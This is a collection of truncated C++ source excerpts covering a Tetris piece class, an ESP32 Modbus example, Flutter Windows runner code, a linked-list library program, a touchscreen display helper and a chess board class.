    "#include \"Figura.h\"\n\n//CONSTRUCTORS\nFigura::Figura() //constructor 1: predeterminat --> inicialitza tot a 0\n{\n\tm_mida = 0;\n\tm_color = NO_COLOR;\n\tm_tipusFigura = NO_FIGURA;\n\tm_posicio.y = 0;\n\tm_posicio.x = 0;\n\n\tfor (int i = 0; i < MAX_ALCADA; i++)\n\t\tfor (int j = 0; j < MAX_AMPLADA; j++)\n\t\t\tm_figura[i][j] = NO_COLOR;\n\n}\n\nFigura::Figura(TipusFigura tipusFigura) //constructor amb parametres (2): inicialitza amb el tipus de figura\n{\n\tm_mida = 0;\n\tm_tipusFigura = tipusFigura;\n\tm_posicio.y = 0;\n\tm_posicio.x = 0;\n\t\n\tfor (int i = 0; i < MAX_ALCADA; i++)\n\t\tfor (int j = 0; j < MAX_AMPLADA; j++)\n\t\t\tm_figura[i][j] = NO_COLOR;\n\n\tswitch (m_tipusFigura)\n\t{\n\tcase FIGURA_O:\n\t\tm_mida = 2;\n\t\tm_color = COLOR_GROC;\n\t\tm_figura[0][0] = COLOR_GROC;\n\t\tm_figura[0][1] = COLOR_GROC;\n\t\tm_figura[1][0] = COLOR_GROC;\n\t\tm_figura[1][1] = COLOR_GROC;\n\t\tbreak;\n\tcase FIGURA_I:\n\t\tm_mida = 4;\n\t\tm_color = COLOR_BLAUCEL;\n\t\tm_figura[1][0] = COLOR_BLAUCEL;\n\t\tm_figura[1][1] = COLOR_BLAUCEL;\n\t\tm_figura[1][2] = COLOR_BLAUCEL;\n\t\tm_figura[1][3] = COLOR_BLAUCEL;\n\t\tbreak;\n\tcase FIGURA_T:\n\t\tm_mida = 3;\n\t\tm_color = COLOR_MAGENTA;\n\t\tm_figura[0][1] = COLOR_MAGENTA;\n\t\tm_figura[1][0] = COLOR_MAGENTA;\n\t\tm_figura[1][1] = COLOR_MAGENTA;\n\t\tm_figura[1][2] = COLOR_MAGENTA;\n\t\tbreak;\n\tcase FIGURA_L:\n\t\tm_mida = 3;\n\t\tm_color = COLOR_TARONJA;\n\t\tm_figura[0][1] = COLOR_TARONJA;\n\t\tm_figura[1][1] = COLOR_TARONJA;\n\t\tm_figura[2][1] = COLOR_TARONJA;\n\t\tm_figura[2][2] = COLOR_TARONJA;\n\t\tbreak;\n\tcase FIGURA_J:\n\t\tm_mida = 3;\n\t\tm_color = COLOR_BLAUFOSC;\n\t\tm_figura[0][1] = COLOR_BLAUFOSC;\n\t\tm_figura[1][1] = COLOR_BLAUFOSC;\n\t\tm_figura[2][0] = COLOR_BLAUFOSC;\n\t\tm_figura[2][1] = COLOR_BLAUFOSC;\n\t\tbreak;\n\tcase FIGURA_Z:\n\t\tm_mida = 3;\n\t\tm_color = COLOR_VERMELL;\n\t\tm_figura[0][0] = COLOR_VERMELL;\n\t\tm_figura[0][1] = COLOR_VERMELL;\n\t\tm_figura[1][1] = COLOR_VERMELL;\n\t\tm_figura[1][2] = COLOR_VERMELL;\n\t\tbreak;\n\tcase FIGURA_S:\n\t\tm_mida = 3;\n\t\tm_color = COLOR_VERD;\n\t\tm_figura[0][1] = COLOR_VERD;\n\t\tm_figura[0][2] = COLOR_VERD;\n\t\tm_figura[1][0] = COLOR_VERD;\n\t\tm_figura[1][1] = COLOR_VERD;\n\t\tbreak;\n\t}\n}\n\n//FUNCIONS\nvoid Figura::incialitza (TipusFigura tipusFigura) // reinicializar la figura\n{\n\tm_mida = 0;\n\tm_tipusFigura = tipusFigura;\n\tm_posicio.y = 0;\n\tm_posicio.x = 0;\n\n\tfor (int i = 0; i < MAX_ALCADA; i++)\n\t\tfor (int j = 0; j < MAX_AMPLADA; j++)\n\t\t\tm_figura[i][j] = NO_COLOR;\n\n\tswitch (m_tipusFigura)\n\t{\n\tcase FIGURA_O:\n\t\tm_mida = 2;\n\t\tm_color = COLOR_GROC;\n\t\tm_figura[0][0] = COLOR_GROC;\n\t\tm_figura[0][1] = COLOR_GROC;\n\t\tm_figura[1][0] = COLOR_GROC;\n\t\tm_figura[1][1] = COLOR_GROC;\n\t\tbreak;\n\tcase FIGURA_I:\n\t\tm_mida = 4;\n\t\tm_color = COLOR_BLAUCEL;\n\t\tm_figura[1][0] = COLOR_BLAUCEL;\n\t\tm_figura[1][1] = COLOR_BLAUCEL;\n\t\tm_figura[1][2] = COLOR_BLAUCEL;\n\t\tm_figura[1][3] = COLOR_BLAUCEL;\n\t\tbreak;\n\tcase FIGURA_T:\n\t\tm_mida = 3;\n\t\tm_color = COLOR_MAGENTA;\n\t\tm_figura[0][1] = COLOR_MAGENTA;\n\t\tm_figura[1][0] = COLOR_MAGENTA;\n\t\tm_figura[1][1] = COLOR_MAGENTA;\n\t\tm_figura[1][2] = COLOR_MAGENTA;\n\t\tbreak;\n\tcase FIGURA_L:\n\t\tm_mida = 3;\n\t\tm_color = COLOR_TARONJA;\n\t\tm_figura[0][2] = COLOR_TARONJA;\n\t\tm_figura[1][0] = COLOR_TARONJA;\n\t\tm_figura[1][1] = COLOR_TARONJA;\n\t\tm_figura[1][2] = COLOR_TARONJA;\n\t\tbreak;\n\tcase FIGURA_J:\n\t\tm_mida = 3;\n\t\tm_color = COLOR_BLAUFOSC;\n\t\tm_figura[0][0] = COLOR_BLAUFOSC;\n\t\tm_figura[1][0] = COLOR_BLAUFOSC;\n\t\tm_figura[1][1] = COLOR_BLAUFOSC;\n\t\tm_figura[1][2] = COLOR_BLAUFOSC;\n\t\tbreak;\n\tcase FIGURA_Z:\n\t\tm_mida = 3;\n\t\tm_color = COLOR_VERMELL;\n\t\tm_figura[0][0] = COLOR_VERMELL;\n\t\tm_figura[0][1] = COLOR_VERMELL;\n\t\tm_figura[1][1] = COLOR_VERMELL;\n\t\tm_figura[1][2] = COLOR_VERMELL;\n\t\tbreak;\n\tcase FIGURA_S:\n\t\tm_mida = 3;\n\t\tm_color = COLOR_VERD;\n\t\tm_figura[0][1] = COLOR_VERD;\n\t\tm_figura[0][2] = COLOR_VERD;\n\t\tm_figura[1][0] = COLOR_VERD;\n\t\tm_figura[1][1] = COLOR_VERD;\n\t\tbreak;\n\t}\n}\n\nvoid Figura::girar(const DireccioGir& gir) //gira la figura\n{\n\tColorFigura transposada[MAX_ALCADA][MAX_AMPLADA];//matriu temporal\n\tColorFigura invertir[MAX_ALCADA][MAX_AMPLADA];//matriu temporal\n\n\tfor (int i = 0; i < m_mida; ++i)\n\t\tfor (int j = 0; j < m_mida; ++j)\n\t\t\ttransposada[j][i] = m_figura[i][j];//crea la trasposada\n\n\tfor (int i = 0; i < m_mida; ++i)\n\t\tfor (int j = 0; j < m_mida; ++j)\n\t\t\tm_figura[i][j] = transposada[i][j];//aplica trasposada a la figura\n\n\tif (gir == GIR_HORARI) //horari = invertir columnes\n\t{\n\t\tfor (int i = 0; i < m_mida; ++i)\n\t\t\tfor (int j = 0; j < m_mida; ++j)\n\t\t\t\tinvertir[i][j] = m_figura[i][m_mida - 1 - j];\n\t}\n\telse\n\t\tfor (int i = 0; i < m_mida; ++i) //antiorari = invertir fila\n\t\t\tfor (int j = 0; j < m_mida; ++j)\n\t\t\t\tinvertir[i][j] = m_figura[m_mida - 1 - i][j];\n\n\tfor (int i = 0; i < m_mida; ++i) // la matriu temporal la copia a la original\n\t\tfor (int j = 0; j < m_mida; ++j)\n\t\t\tm_figura[i][j] = invertir[i][j];\n}\n\n\nvoid Figura::baixar(const int& dirY)\n{\n    if (dirY == -1) { //no valid\n        m_posicio.y -= 1; //puja\n    } else {\n        m_posicio.y += 1; //baixa\n    }\n}// se mueve para abajo pero en el momento que no pueda sube\n\nvoid Figura::moure(const int& dirX)\n{\n    if (dirX == -1) {\n        m_posicio.x ",
    "#include <DynamicModbusMaster.h>\n#include <ModbusErrorHelper.h>\n#include <sdkconfig.h>\n#include <esp_log.h>\n#include <inttypes.h>\n#include \"AggregateDevice.h\"\n\ndynamic_modbus_master::DynamicModbusMaster master;\n\ndynamic_modbus_master::ModbusConfig config {\n        .uartPort = static_cast<uart_port_t>(CONFIG_MB_UART_PORT_NUM),\n        .rxdPin = CONFIG_MB_UART_RXD,\n        .txdPin = CONFIG_MB_UART_TXD,\n        .rtsPin = CONFIG_MB_UART_RTS,\n        .baudRate = CONFIG_MB_UART_BAUD_RATE,\n        #ifdef CONFIG_MB_COMM_MODE_RTU\n        .modbusMode = MB_MODE_RTU,\n        #elif CONFIG_MB_COMM_MODE_ASCII\n        .modbusMode = MB_MODE_ASCII\n        #endif\n};\n\nAggregateDevice g_exampleDevice(1, 1);\n\nextern \"C\" void app_main(void) {\n    dynamic_modbus_master::ModbusError error = master.initialise(config);\n    if (error != dynamic_modbus_master::ModbusError::OK) {\n        ESP_LOGE(\"app_main\", \"Modbus initialization failed: %s\", dynamic_modbus_master::ModbusErrorHelper::modbusErrorToName(error).c_str());\n        return;\n    }\n    \n    error = master.start();\n    if (error != dynamic_modbus_master::ModbusError::OK) {\n        ESP_LOGE(\"app_main\", \"Modbus start failed: %s\", dynamic_modbus_master::ModbusErrorHelper::modbusErrorToName(error).c_str());\n        return;\n    }\n    \n    while(true) {\n        auto singleRegisterData = g_exampleDevice.readExampleSingleRegister();\n        auto multipleRegisterData = g_exampleDevice.readExampleMultipleRegisters();\n        auto floatRegisterData = g_exampleDevice.readExampleFloat();\n        auto singleCoilValue = g_exampleDevice.readExampleSingleCoil();\n        auto multipleCoilValue = g_exampleDevice.readExampleMultipleCoils();\n        auto discreteInputValue = g_exampleDevice.readDiscreteInput();\n        auto inputValue = g_exampleDevice.readInput();\n        \n        ESP_LOGI(\"Example Device\", \"Single Register Read: %u ; Multiple Register Read: %\" PRIu32 \" ; Float Register Read: %f\", singleRegisterData, multipleRegisterData, floatRegisterData);\n        ESP_LOGI(\"Example Device\", \"Single Coil Read: %s ; Multiple Coil Read: %u\", (singleCoilValue ? \"On\" : \"Off\"), multipleCoilValue);\n        ESP_LOGI(\"Example Device\", \"Discrete Input State: %s ; Input Value: %u\", (discreteInputValue ? \"On\" : \"Off\"), inputValue);\n        \n        singleRegisterData++;\n        multipleRegisterData++;\n        floatRegisterData++;\n        singleCoilValue = !singleCoilValue;\n        multipleCoilValue++;\n        \n        g_exampleDevice.writeExampleSingleRegister(singleRegisterData);\n        g_exampleDevice.writeExampleMultipleRegisters(multipleRegisterData);\n        g_exampleDevice.writeExampleFloat(floatRegisterData);\n        g_exampleDevice.writeExampleSingleCoil(singleCoilValue);\n        g_exampleDevice.writeExampleMultipleCoils(multipleCoilValue);\n        \n        vTaskDelay(pdMS_TO_TICKS(1000));\n    }\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"chat_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"iostream\"\nusing namespace std;\nconst int max_node = 10;\nstruct node\n{\n    int book_no = -1;\n    string title;\n    string author;\n    string isbn;\n    int availability_stat;\n    int next = 0;\n};\nnode a[max_node];\nint create()\n{\n    int head, i;\n    cout << \"Enter index of first node: \";\n    cin >> i;\n    head = i;\n    while (i != 0)\n    {\n        cout << \"Enter book number : \" << endl;\n        cin >> a[i].book_no;\n        cout << endl;\n        cout << \"Enter Title of the Book : \";\n        cin >> a[i].title;\n        cout << endl;\n        cout << \"Enter Author : \";\n        cin >> a[i].author;\n        cout << \"Enter ISBN : \";\n        cin >> a[i].isbn;\n        cout << endl;\n        cout << \"Enter availability status : \";\n        cin >> a[i].availability_stat;\n        cout << endl;\n        cout << \"Enter index of next book(press 0 to stop) : \";\n        cin >> a[i].next;\n        cout << endl;\n        i = a[i].next;\n    }\n    return head;\n}\nvoid display_search(int head)\n{\n    cout << \"\\n\\nBook No\\t|\\tTitle\\t|\\tAuthor\\t|\\tISBN\\t| Availability\\t|\\tbook pos.\\t|\\n\\n\";\n    cout << \"--------------------------------------------------------------------------\\n\";\n    int i = head;\n    cout << a[i].book_no << \"\\t|\\t\" << a[i].title << \"\\t|\\t\" << a[i].author << \"\\t|\\t\" << a[i].isbn << \"\\t|\\t\" << a[i].availability_stat << i << \"\\t|\\n\";\n}\nvoid display(int head)\n{\n    int i = head;\n    cout << \"\\n\\ncount\\t|\\tBook No\\t|\\tTitle\\t|\\tAuthor\\t|\\tISBN\\t| Availability\\t|  book pos.\\t|  next\\n\\n \";\n    cout << \"-------------------------------------------------------------------------------------------------------------------------\\n\";\n    int count = 1;\n    while (i != 0)\n    {\n        if (a[i].book_no != -1)\n        {\n            cout << count << \"\\t|\\t\" << a[i].book_no << \"\\t|\\t\" << a[i].title << \"\\t|\\t\" << a[i].author << \"\\t|\\t\" << a[i].isbn << \"\\t|\\t\" << a[i].availability_stat << \"\\t|\\t\" << i << \"\\t|\\t\" << a[i].next << \"\\t|\\n \";\n        }\n        count++;\n        i = a[i].next;\n    }\n    cout << \"NULL\" << endl;\n}\nvoid insert()\n{\n    int new_book_no, temp;\n    string new_title, new_author, new_isbn;\n    int new_availability_stat;\n\n    cout << \"Enter book number : \" << endl;\n    cin >> new_book_no;\n    cout << endl;\n    cout << \"Enter Title of the Book : \";\n    cin >> new_title;\n    cout << endl;\n    cout << \"Enter Author : \";\n    cin >> new_author;\n    cout << \"Enter ISBN : \";\n    cin >> new_isbn;\n    cout << endl;\n    cout << \"Enter availability status : \";\n    cin >> new_availability_stat;\n    cout << endl;\n    cout << \"Enter book_no after which you want to insert: \";\n    cin >> temp;\n    for (int i = 0; i < max_node; i++)\n    {\n        if (a[i].book_no == temp)\n        {\n            for (int j = i + 1; j < max_node; j++)\n            {\n                if (a[j].book_no == -1)\n                {\n                    a[j].book_no = new_book_no;\n                    a[j].title = new_title;\n                    a[j].author = new_author;\n                    a[j].isbn = new_isbn;\n                    a[j].availability_stat = new_availability_stat;\n                    a[j].next = a[i].next;\n                    a[i].next = j;\n                    return;\n                }\n            }\n        }\n    }\n    cout << \"Element not found\" << endl;\n}\nint delete_data(int head)\n{\n    int temp;\n    cout << \"Enter book_no number you want to delete : \";\n    cin >> temp;\n    int prev = 0;\n    int current = head;\n    if (a[current].book_no == temp)\n    {\n        a[current].book_no = -1;\n        head = a[current].next;\n    }\n    while (current != 0)\n    {\n        prev = current;\n        current = a[current].next;\n        if (a[current].book_no == temp)\n        {\n            a[current].book_no = -1;\n            a[prev].next = a[current].next;\n            a[current].next = 0;\n            return 0;\n        }\n    }\n    cout << \"Element not found\";\n    return head;\n}\n\nvoid search(int head)\n{\n    int val;\n    cout << \"Enter element you want to find: \";\n    cin >> val;\n    int i = head;\n    bool flag = true;\n    while (i != 0)\n    {\n        if (a[i].book_no == val)\n        {\n            cout << \"book_no found\" << endl;\n            display_search(i);\n            flag = false;\n        }\n        i = a[i].next;\n    }\n    if (flag == true)\n    {\n        cout << \"book_no not found\";\n    }\n}\nint main()\n{\n    int head = create();\n    cout << \" Library Created... \" << endl;\n    int ch;\n    do\n    {\n        cout << \"Menu\\n1)insert\\n2)display\\n3)delete_book_no\\n4)search\\n5)exit\\nEnter your choice : \";\n        cin >> ch;\n        switch (ch)\n        {\n        case 1:\n            insert();\n            break;\n        case 2:\n            display(head);\n            break;\n        case 3:\n            delete_data(head);\n            break;\n        case 4:\n            search(head);\n            break;\n        case 5:\n            exit(0);\n        }\n        cout << \"\\ndo you want to continue(1/0) : \";\n        cin >> ch;\n    } while (ch == 1);\n    return 0;\n}",
    "#include <Arduino.h>\n#include <LovyanGFX.hpp>\n#include \"lgfx_ESP32_2432S028.h\"\n#include <SPI.h>\n\nusing Action = void(&)(LGFX &lcd);\n\nvoid nop(LGFX &lcd){};\n\nvoid calibrateTouchPad(LGFX &lcd)\n  {\n    lcd.fillScreen(TFT_BLACK);\n    lcd.setTextSize((std::max(lcd.width(), lcd.height()) + 255) >> 8);\n\n    //if (lcd.width() < lcd.height()) lcd.setRotation(lcd.getRotation() ^ 1);\n\n    // Draws guidance text on the screen\n    lcd.setTextDatum(textdatum_t::middle_center);\n    lcd.setTextSize(1.0);\n    lcd.drawString(\"touch the arrow marker\", lcd.width()>>1, lcd.height() >> 1);\n    lcd.setTextDatum(textdatum_t::top_left);\n\n    // When using touch, perform calibration. Touch the tips of the arrows \n    // that appear in the four corners of the screen in sequence.\n    uint16_t fg = TFT_WHITE;\n    uint16_t bg = TFT_BLACK;\n    if (lcd.isEPD()) std::swap(fg, bg);\n    uint16_t caldata[8];\n    lcd.calibrateTouch(caldata, fg, bg, std::max(lcd.width(), lcd.height()) >> 3);\n    //lcd.calibrateTouch(nullptr, fg, bg, 20);\n    Serial.printf(R\"(\nRaw Touch Values\n----------------\nx0 = %4d y0 =%4d\nx1 = %4d y1 =%4d\nx2 = %4d y2 =%4d\nx3 = %4d y3 =%4d \n)\", caldata[0], caldata[1], caldata[2], caldata[3], \n    caldata[4], caldata[5], caldata[6], caldata[7]);\n    \n    log_e(\"==> done\");\n  }\n\n\n/**\n * Draw a framed crosshair in portrait orientation\n*/\nvoid framedCrosshair(LGFX &lcd)\n{\n  char str[24]; \n  lcd.fillScreen(TFT_BLACK);\n  lcd.drawRect(0,0, lcd.width(), lcd.height(), TFT_RED);\n  lcd.drawLine(0,0, lcd.width(), lcd.height(), TFT_GREEN);\n  lcd.drawLine(lcd.width(),0, 0, lcd.height(), TFT_BLUE);\n  lcd.fillRect(0,0, 20, 20, TFT_GREEN);\n  lcd.fillRect(lcd.width()-10,lcd.height()-10, 10, 10, TFT_RED);;\n  lcd.setTextSize(1.0);\n  sprintf(str, \"(0,0) origin, rot=%d\", lcd.getRotation());\n  lcd.drawString(str, 25,0);\n}\n\n/**\n * Draw a grid 20 x 20 \n*/\nvoid grid(LGFX &lcd)\n{\n  int x = 0, y = 0, d = 20;\n  lcd.fillScreen(TFT_BLACK);\n  while (y < lcd.height())\n  {\n    lcd.drawLine(0, y, lcd.width(), y, TFT_WHITE);\n    y += d;\n  }\n\n  while (x < lcd.width())\n  {\n    lcd.drawLine(x, 0, x, lcd.height(), TFT_WHITE);\n    x += d;\n  }\n  \n}\n\n/**\n * Show some facts about the display\n*/\nvoid lcdInfo(LGFX &lcd)\n{\n  Serial.printf(R\"(\nLCD Info\n--------\nwidth x height = %d x %d \nrotation       = %d \ncolor depth    = %d \ntext size X    = %4.2f\ntext size Y    = %4.2f\n)\", lcd.width(), lcd.height(), lcd.getRotation(), lcd.getColorDepth(),\n    lcd.getTextSizeX(), lcd.getTextSizeY());\n  Serial.printf(\"\\n\");\n}\n\n\nGFXfont defaultFont = fonts::DejaVu18;\n\n/**\n * Initialize display and call the greeting function.\n * The default for greeting is nop(). To calibrate the \n * touchscreen call it as initDisplay(lcd, calibrateTouchScreen).\n * The greeting function takes as argument the passed lcd\n*/\nvoid initDisplay(LGFX &lcd, uint8_t rotation=0, GFXfont *theFont=&defaultFont, Action greet=nop)\n  {\n    lcd.begin() ? log_i(\"--> done\") : log_i(\"--> failed\");\n    lcd.clear();\n    lcd.setTextSize(1.0);\n    lcd.setTextDatum(lgfx::textdatum::TL_DATUM);\n    lcd.setFont(theFont);\n    lcd.setRotation(rotation);\n    lcd.setBrightness(255);\n    greet(lcd);\n    log_i(\"==> done\");\n  }\n",
    "// Copyright (2024)\n\n#include \"Board.hpp\"\n\nBoard::Board() {\n    _board = std::vector<std::vector<std::shared_ptr<Piece>>>\n            (8, std::vector<std::shared_ptr<Piece>>(8));\n    for (int i = 0; i < 8; i++) {\n        _board[6][i] = std::make_shared<Pawn>(White, false);\n    }\n\n    for (int i = 0; i < 8; i++) {\n        _board[1][i] = std::make_shared<Pawn>(Black, false);\n    }\n\n    _board[0][0] = std::make_shared<Rook>(Black);\n    _board[0][1] = std::make_shared<Knight>(Black);\n    _board[0][2] = std::make_shared<Bishop>(Black);\n    _board[0][3] = std::make_shared<Queen>(Black);\n    _board[0][4] = std::make_shared<King>(Black);\n    _board[0][5] = std::make_shared<Bishop>(Black);\n    _board[0][6] = std::make_shared<Knight>(Black);\n    _board[0][7] = std::make_shared<Rook>(Black);\n\n    _board[7][0] = std::make_shared<Rook>(White);\n    _board[7][1] = std::make_shared<Knight>(White);\n    _board[7][2] = std::make_shared<Bishop>(White);\n    _board[7][3] = std::make_shared<Queen>(White);\n    _board[7][4] = std::make_shared<King>(White);\n    _board[7][5] = std::make_shared<Bishop>(White);\n    _board[7][6] = std::make_shared<Knight>(White);\n    _board[7][7] = std::make_shared<Rook>(White);\n}\n\nvoid Board::write(int row, int col, std::shared_ptr<Piece> p) {\n    _board[row][col] = p;\n}\n\nvoid Board::swap(int row, int col, int dRow, int dCol) {\n    _board[dRow][dCol] = _board[row][col];\n    _board[row][col] = nullptr;\n}\n\nbool Board::move(int row, int col, int dRow, int dCol) {\n    if (_board[row][col] == nullptr) {\n        std::cout << \"Invalid Move: Empty Square\" << std::endl;\n        return false;\n    }\n\n    // Bounds checking\n    if (row > 7 || row < 0 || col > 7 || col < 0 ||\n        dRow > 7 || dRow < 0 || dCol > 7 || dCol < 0) {\n        std::cout << \"Invalid Move: Out of bounds\" << std::endl;\n        return false;\n    }\n\n    // See if the move is even a legal piece movemement\n    if (_board[row][col]->type() == P) {\n        if (!_board[row][col]->move(row, col, dRow, dCol, _board)) {\n            std::cout << \"Invalid Piece Movement. Please refer to the rules\" << std::endl;\n            return false;\n        }\n    } else {\n        if (!_board[row][col]->move(row, col, dRow, dCol)) {\n            std::cout << \"Invalid Piece Movement. Please refer to the rules\" << std::endl;\n            return false;\n        }\n    }\n\n    // Cannot move past a piece. Knights skip this check\n    if (_board[row][col]->type() != K && obstruction(row, col, dRow, dCol)) {\n        std::cout << \"Invalid Move: You cannot move past a piece\" << std::endl;\n        return false;\n    }\n\n    // Capturing logic\n    if (_board[dRow][dCol] != nullptr) {\n        pcolor curColor = _board[row][col]->color();\n        pcolor destColor = _board[dRow][dCol]->color();\n\n        if (curColor == destColor) {\n            std::cout << \"Invalid Move: You cannot capture your own piece\" << std::endl;\n            return false;\n        }\n\n        switch (curColor) {\n            case White:\n                _wjail.push_back(_board[dRow][dCol]);\n                break;\n            default:\n                _bjail.push_back(_board[dRow][dCol]);\n                break;\n        }\n    }\n\n    // Simulate movement\n    _board[dRow][dCol] = _board[row][col];\n    _board[row][col] = nullptr;\n    return true;\n}\n\nstd::ostream& operator<<(std::ostream& out, Board &b) {\n    out << \"  a b c d e f g h\\n\";\n    for (unsigned int i = 0; i < 8; i++) {\n        out << 8-i << \" \";\n        for (unsigned int j = 0; j < 8; j++) {\n            if (b._board[i][j] != nullptr) {\n                out << b._board[i][j]->id() << \" \";\n            } else {\n                out << \" \" << \" \";\n            }\n        }\n        out << std::endl;\n    }\n\n    out << \"\\n\";\n    out << \"Captured Pieces:\\n\";\n    out << \"White: \";\n    for (std::shared_ptr<Piece> p : b._wjail) {\n        out << p->id() << \" \";\n    }\n    out << \"\\nBlack: \";\n    for (std::shared_ptr<Piece> p : b._bjail) {\n        out << p->id() << \" \";\n    }\n\n\n    return out;\n}\n\nbool Board::obstruction(int row, int col, int dRow, int dCol) {\n    int changeRow = dRow - row;\n    int changeCol = dCol - col;\n\n    // Check for Right Linear Obstruction\n    if (changeRow == 0 && changeCol > 0) {\n        for (int i = col + 1; i < dCol; i++) {\n            if (_board[row][i] != nullptr) {\n                // std::cout << \"RL-Branch Taken\" << std::endl;\n                return true;\n            }\n        }\n        // std::cout << \"RL-Branch NOT Taken\" << std::endl;\n        return false;\n    }\n\n    // Check for Left Linear Obstruction\n    if (changeRow == 0 && changeCol < 0) {\n        for (int i = col - 1; i > dCol; i--) {\n            if (_board[row][i] != nullptr) {\n                // std::cout << \"LL-Branch Taken\" << std::endl;\n                return true;\n            }\n        }\n        // std::cout << \"LL-Branch NOT Taken\" << std::endl;\n        return false;\n    }\n\n    // Check for Up Linear Obstruction\n    if (changeCol == 0 && changeRow < 0) {\n        for (int i = row - ",
